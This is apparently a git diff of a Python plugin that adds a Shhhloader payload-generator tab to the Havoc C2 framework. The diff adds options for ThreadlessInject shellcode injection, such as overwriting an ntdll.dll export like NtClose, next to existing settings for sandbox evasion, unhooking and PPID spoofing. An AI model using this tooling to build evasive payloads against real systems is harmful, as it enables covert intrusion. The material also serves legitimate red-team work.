@@ -3,7 +3,7 @@
 # Author: Jakob Friedl
 # Created on: Mon, 16. Oct 2023
 # Description: Shhhloader support for Havoc C2 framework
-# Usage: Load this script in Havoc under Scripts -> Scripts Manager to create Shhhloader Tab
+# Usage: Load this script into Havoc: Scripts -> Scripts Manager to create Shhhloader Tab
 
 import os, sys, subprocess
 import havoc
@@ -33,8 +33,8 @@ parent_process = "explorer.exe"
 sandbox_evasion_method = "sleep"
 sandbox_argument = ""
 create_process_flag = ""
-target_dll = ""
-export_function = ""
+target_dll = "ntdll.dll"
+export_function = "NtClose"
 
 # Colors
 havoc_red = "#ff5555"
@@ -48,7 +48,7 @@ if not os.path.exists(shhhloader_path):
 os.chdir(shhhloader_path)
 
 # Create dialog and log widget
-dialog = havocui.Dialog("Shhhloader Payload Generator")
+dialog = havocui.Dialog("Shhhloader Payload Generator", True, 670, 800)
 log = havocui.Logger("Shhhavoc Log")
 
 # Add Options
@@ -80,7 +80,7 @@ def change_syscall_exec_method(num):
 dialog.addCombobox(change_syscall_exec_method, "GetSyscallStub", *syscall_exec_methods)
 
 dialog.addLabel("<b>[*] Shellcode execution method</b>")
-shellcode_exec_methods = ["TreadlessInject", "ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadCOntext", "RemoteThreadSuspended", "CurrentThread"]
+shellcode_exec_methods = ["ThreadlessInject", "ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadCOntext", "RemoteThreadSuspended", "CurrentThread"]
 def change_shellcode_exec_method(num):
     global shellcode_exec_method
     if num:
@@ -189,24 +189,45 @@ def change_proxy_dll(arg):
     print("[*] Proxy DLL changed: ", proxy_dll)
 dialog.addLineedit("e.g. apphelp.dll", change_proxy_dll)
 
-dialog.addLabel(f"<b>[#] Parent process for PPID spoofing</b>")
+dialog.addLabel(f"<b>[#] Parent process for PPID spoofing (Default: explorer.exe)</b>")
 def change_parent_process(p): 
     global parent_process
     parent_process = p
     print("[*] Parent process changed: ", parent_process)
 dialog.addLineedit("e.g. explorer.exe", change_parent_process)
 
+dialog.addLabel("<b>────────────────────────────── ThreadlessInject ──────────────────────────────</b>")
+
+def change_create_process():
+    global create_process_flag
+    create_process_flag = "-cp" if not bool(create_process_flag) else ""
+    print("[*] Create-process flag changed: ", bool(create_process_flag))
+dialog.addCheckbox("Create process instead of injecting into one (Default: False)", change_create_process)
+
+dialog.addLabel(f"<b>[#] Target DDL containing export function (Default: ntdll.dll)</b>")
+def change_target_dll(arg): 
+    global target_dll
+    target_dll = arg 
+    print("[*] Target DLL changed: ", target_dll)
+dialog.addLineedit("e.g. ntdll.dll", change_target_dll)
+
+dialog.addLabel(f"<b>[#] Export function to overwrite (Default: NtClose)</b>")
+def change_export_function(arg): 
+    global export_function
+    export_function = arg 
+    print("[*] Export function changed: ", export_function)
+dialog.addLineedit("e.g. NtClose", change_export_function)
+
+dialog.addLabel("")
+
 # Payload generation
 def run():
-
     if shellcode_path == "":
         havocui.messagebox("Error", "Please specify a valid shellcode path.")
         return
-
-    outfile = havocui.savefiledialog("Save").decode("ascii")
     
     flags = f"{unhook_flag} {dll_flag} {verbose_flag} {llvm_flag} {no_randomize_flag} {no_sandbox_flag} {word_encode_flag} {ppid_flag} {ppid_priv_flag}"
-
+    
     if sandbox_evasion_method != "sleep":
         flags = flags + f" -s {sandbox_evasion_method}"
     if sandbox_argument != "":
@@ -218,6 +239,12 @@ def run():
     if process != "":
         flags = flags + f" -p {process}"
 
+    # Threadless Inject options
+    if shellcode_exec_method == "ThreadlessInject":
+       flags = flags + f" {create_process_flag} -td {target_dll} -ef {export_function}" 
+
+    outfile = havocui.savefiledialog("Save").decode("ascii")
+    
     cmd = f"{python_path} {shhhloader_path}/Shhhloader.py {shellcode_path} -sc {syscall_exec_method} -m {shellcode_exec_method} -o {outfile} {flags}"
 
     output = subprocess.run([arg for arg in cmd.split(" ") if arg != ""], capture_output = True, text = True)
